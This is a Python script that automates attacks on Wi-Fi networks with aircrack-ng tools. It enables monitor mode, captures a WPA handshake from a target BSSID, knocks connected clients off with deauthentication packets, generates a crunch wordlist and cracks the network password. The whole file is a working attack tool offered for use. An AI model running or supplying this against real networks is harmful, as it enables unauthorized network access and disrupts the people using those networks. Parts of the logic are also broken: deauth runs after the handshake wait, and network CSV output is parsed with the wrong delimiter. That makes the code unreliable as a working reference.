import subprocess
import os
import time
import shutil
import logging
import argparse
from functools import wraps
from pathlib import Path

# Setup logging with dynamic verbosity
def setup_logging(verbose):
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

# Exception handling decorator with optional retries and backoff
def command_decorator(success_message=None, failure_message=None, retries=1, backoff=2):
    def decorator(func):
        @wraps(func)
        def wrapper(self, *args, **kwargs):
            delay = backoff
            for attempt in range(retries):
                try:
                    result = func(self, *args, **kwargs)
                    if self.runner.check(result, success_message, failure_message):
                        return True
                except subprocess.SubprocessError as e:
                    logging.error(f"Subprocess error during {func.__name__}: {e}")
                except Exception as e:
                    logging.error(f"Error during {func.__name__}: {e}")
                if attempt < retries - 1:
                    logging.warning(f"Retrying {func.__name__}... (Attempt {attempt + 1}/{retries})")
                    time.sleep(delay)
                    delay *= backoff  # Exponential backoff
            return False
        return wrapper
    return decorator

# Run commands with error handling and verbosity support
class CommandRunner:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def run(self, cmd, timeout=None, shell=False):
        if self.verbose:
            logging.debug(f"Running command: {' '.join(cmd)}")
        try:
            return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=shell)
        except subprocess.TimeoutExpired:
            logging.error(f"Command timed out: {' '.join(cmd)}")
        except (FileNotFoundError, OSError) as e:
            logging.error(f"Command failed: {e}")
        return None

    def check(self, result, success_message=None, failure_message=None):
        if result and result.returncode == 0:
            if success_message:
                logging.info(success_message)
            return True
        else:
            if failure_message:
                logging.error(failure_message)
            return False

# Wrapper-class with wireless attacks and password cracking
class AircrackNGWrapper:
    def __init__(self, runner: CommandRunner):
        self.runner = runner
        self.interface = None
        self.wordlist_path = None
        self.bssid = None
        self.channel = None
        self.capture_file = None
        self.client_bssid = None
        self.handshake_timeout = 120  # Timeout in seconds for handshake capture

    def configure(self, args):
        self.interface = args.interface or self.auto_select_interface()
        if not args.bssid:
            self.list_networks()
            self.bssid = self.get_input("Enter the BSSID of the target network")
        else:
            self.bssid = args.bssid
        
        if not args.channel:
            self.channel = self.get_input("Enter the channel of the target network")
        else:
            self.channel = args.channel

        self.capture_file = self.get_input("Enter the filename to save the capture", "capture")

        # Optional deauth attack
        self.client_bssid = args.client_bssid

        # Wordlist configuration
        if args.crunch:
            self.generate_wordlist_with_crunch()
        else:
            self.wordlist_path = args.wordlist or self.get_input("Enter the path to your existing wordlist file")

        # Validate file paths
        self.validate_paths()

    def auto_select_interface(self):
        interfaces = self.get_interfaces()
        if interfaces:
            return interfaces[0]  # Automatically select the first available interface
        else:
            logging.error("No wireless interfaces found.")
            exit(1)

    def validate_paths(self):
        if self.wordlist_path and not Path(self.wordlist_path).is_file():
            logging.error(f"Wordlist file '{self.wordlist_path}' does not exist.")
            exit(1)

        capture_dir = Path(self.capture_file).parent
        if not capture_dir.exists():
            logging.error(f"Capture file directory '{capture_dir}' does not exist.")
            exit(1)

    def get_interfaces(self):
        result = self.runner.run(['iwconfig'])
        if result:
            return [line.split()[0] for line in result.stdout.splitlines() if "IEEE 802.11" in line or "wlan" in line]
        return []

    def list_networks(self):
        logging.info("Scanning for networks...")
        cmd = ['sudo', 'airodump-ng', '--band', 'g', '--output-format', 'csv', '--write', 'temp_scan', self.interface]
        result = self.runner.run(cmd, timeout=30)
        if result:
            networks = self.parse_networks_from_csv('temp_scan-01.csv')
            self.bssid = self.select_network(networks)
            self.channel = self.get_input("Enter the channel of the target network")
        else:
            logging.error("Failed to scan for networks.")
            exit(1)

    def parse_networks_from_csv(self, file_path):
        networks = []
        with open(file_path, 'r') as file:
            for line in file:
                if "BSSID" in line:
                    continue
                parts = line.split(';')
                if len(parts) > 1:
                    bssid = parts[0].strip()
                    ssid = parts[13].strip()
                    networks.append((bssid, ssid))
        return networks

    def select_network(self, networks):
        print("Available networks:")
        for idx, (bssid, ssid) in enumerate(networks):
            print(f"{idx + 1}: BSSID: {bssid}, SSID: {ssid}")
        choice = int(self.get_input(f"Select a network (1-{len(networks)}): ")) - 1
        return networks[choice][0]

    @command_decorator("Monitor mode started", "Failed to start monitor mode")
    def start_monitor_mode(self):
        return self.runner.run(['sudo', 'airmon-ng', 'start', self.interface])

    @command_decorator("Monitor mode stopped", "Failed to stop monitor mode")
    def stop_monitor_mode(self):
        return self.runner.run(['sudo', 'airmon-ng', 'stop', self.interface])

    def verify_monitor_mode(self):
        result = self.runner.run(['iwconfig'])
        if result and (f"{self.interface}mon" in result.stdout or "Mode:Monitor" in result.stdout):
            if not "mon" in self.interface:
                self.interface += 'mon'
            return True
        return False

    def capture_handshake(self):
        cmd = self.build_airodump_cmd()
        logging.info(f"Starting handshake capture on BSSID {self.bssid}, channel {self.channel}...")
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.wait_for_handshake(process)

    def wait_for_handshake(self, process):
        start_time = time.time()
        while time.time() - start_time < self.handshake_timeout:
            capture_file_path = f"{self.capture_file}-01.cap"
            if os.path.exists(capture_file_path) and self.is_handshake_captured():
                logging.info("Handshake captured!")
                process.terminate()
                return True
            time.sleep(5)
        process.terminate()
        logging.error("Handshake not captured within the timeout period.")
        exit(1)

    def is_handshake_captured(self):
        result = self.runner.run(['aircrack-ng', '-a2', '-w', '/dev/null', f"{self.capture_file}-01.cap"])
        return result and "1 handshake" in result.stdout

    def capture_clients(self):
        """Capture connected clients from the airodump-ng output."""
        cmd = ['sudo', 'airodump-ng', '--bssid', self.bssid, '--channel', self.channel, self.interface]
        result = self.runner.run(cmd, timeout=30)  # Increased timeout
        if result:
            client_bssids = []
            for line in result.stdout.splitlines():
                if self.bssid in line and len(line.split()) > 1:
                    client_bssids.append(line.split()[1])  # Assuming the second field contains the client BSSID
            if client_bssids:
                self.client_bssid = client_bssids[0]  # Automatically set the first client BSSID found
                logging.info(f"Found client BSSID: {self.client_bssid}")
            else:
                logging.error("No clients found. Unable to perform deauth attack.")
        else:
            logging.error("Failed to capture clients.")

    def deauth_client(self):
        if not self.client_bssid:
            return  # Deauth attack is optional
        
        for attempt in range(3):
            logging.info(f"Attempt {attempt + 1}: Sending deauth packets to {self.client_bssid}...")
            result = self.runner.run(['sudo', 'aireplay-ng', '--deauth', '10', '-a', self.bssid, '-c', self.client_bssid, self.interface])
            if self.runner.check(result, f"Deauth successful on {self.client_bssid}", f"Deauth failed on attempt {attempt + 1}"):
                return
            time.sleep(2)
        logging.error(f"Failed to deauth client {self.client_bssid} after 3 attempts.")
        exit(1)

    def generate_wordlist_with_crunch(self):
        if not shutil.which('crunch'):
            logging.error("Crunch is not installed.")
            exit(1)

        min_length = self.get_input("Enter the minimum length for the passwords")
        max_length = self.get_input("Enter the maximum length for the passwords")
        charset = self.get_input("Enter the character set to use (e.g., abc123@)")
        output_file = self.get_input("Enter the file to save the generated wordlist", "wordlist.txt")

        result = self.runner.run(['crunch', min_length, max_length, charset, '-o', output_file], timeout=300)
        if self.runner.check(result, f"Wordlist generated and saved to {output_file}", "Error generating wordlist"):
            self.wordlist_path = output_file

    def crack_password(self):
        capture_file = f"{self.capture_file}-01.cap"
        if not Path(capture_file).is_file():
            logging.error(f"Capture file '{capture_file}' not found.")
            exit(1)

        if not self.wordlist_path:
            logging.error("Wordlist path is not set.")
            exit(1)

        cmd = ['aircrack-ng', '-a2', '-w', self.wordlist_path, capture_file]
        result = self.runner.run(cmd)
        if result:
            logging.info(result.stdout)
        else:
            logging.error("Failed to crack the password.")

    def get_input(self, prompt, default=None):
        if default:
            prompt = f"{prompt} (default: {default})"
        else:
            prompt = f"{prompt}:"
        user_input = input(prompt).strip()
        return user_input or default

    def build_airodump_cmd(self):
        return [
            'sudo', 'airodump-ng', '--bssid', self.bssid, '--channel', self.channel, 
            '--write', self.capture_file, self.interface
        ]

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Aircrack-ng Wrapper Script")
    parser.add_argument('--interface', help='Wireless interface to use')
    parser.add_argument('--bssid', help='BSSID of the target network')
    parser.add_argument('--channel', help='Channel of the target network')
    parser.add_argument('--wordlist', help='Path to the wordlist file')
    parser.add_argument('--crunch', action='store_true', help='Generate wordlist using crunch')
    parser.add_argument('--client-bssid', help='BSSID of a connected client for deauth attack')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    args = parser.parse_args()

    setup_logging(args.verbose)
    runner = CommandRunner(verbose=args.verbose)
    aircrack_wrapper = AircrackNGWrapper(runner)
    aircrack_wrapper.configure(args)
    aircrack_wrapper.start_monitor_mode()
    if aircrack_wrapper.verify_monitor_mode():
        aircrack_wrapper.capture_handshake()
        aircrack_wrapper.capture_clients()
        aircrack_wrapper.deauth_client()
        aircrack_wrapper.crack_password()
    aircrack_wrapper.stop_monitor_mode()
